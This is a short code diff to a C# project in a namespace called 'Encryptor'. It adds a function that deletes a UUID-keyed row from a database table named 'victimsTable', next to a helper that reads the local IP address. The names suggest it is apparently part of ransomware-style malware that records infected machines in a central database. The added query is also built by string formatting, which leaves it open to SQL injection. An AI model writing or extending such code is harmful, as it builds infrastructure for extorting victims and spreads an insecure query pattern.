@@ -91,7 +91,19 @@ namespace Encryptor
 			DBConnection.Close();
 			return stautus;
 		}
-		
+
+		public static void deleteVictimsRow()
+		{
+			SqlConnection DBConnection = new SqlConnection(sdwConnectionString);
+			DBConnection.Open();
+
+			string query = String.Format("DELETE FROM victimsTable WHERE UUID='{0}';",UUID);
+
+			SqlCommand queryCommand = new SqlCommand(query, DBConnection);
+			SqlDataReader queryCommandReader = queryCommand.ExecuteReader();
+
+			DBConnection.Close();
+		}
 
 		private static string GetLocalIPAddress()
 		{
